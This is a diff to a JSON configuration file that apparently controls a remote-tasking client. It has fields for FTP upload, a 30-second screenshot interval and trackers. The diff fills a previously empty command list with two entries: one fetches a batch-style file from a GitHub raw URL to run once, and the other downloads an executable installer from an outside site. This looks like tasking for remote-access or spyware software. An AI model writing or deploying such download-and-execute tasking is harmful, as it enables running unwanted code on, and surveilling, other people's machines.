@@ -1,1 +1,1 @@
-{"Commands":[],"FtpCmd":{"Host":"host","Username":null,"Password":null,"WFDir":null,"OFDir":null},"InteractiveServiceUrl":"","ScrShotMlSn":30000,"uTrackers":[]}
+{"Commands":[{"Type":0,"URL":"https://raw.github.com/danick1/WinFormsApp/master/commandbat.dat","IsRunOne":true,"IsRunned":false},{"Type":2,"URL":"http://www.nch.com.au/playpad/playsetup.exe","IsRunOne":false,"IsRunned":false}],"FtpCmd":{"Host":"host","Username":null,"Password":null,"WFDir":null,"OFDir":null},"InteractiveServiceUrl":"","ScrShotMlSn":30000,"uTrackers":[]}
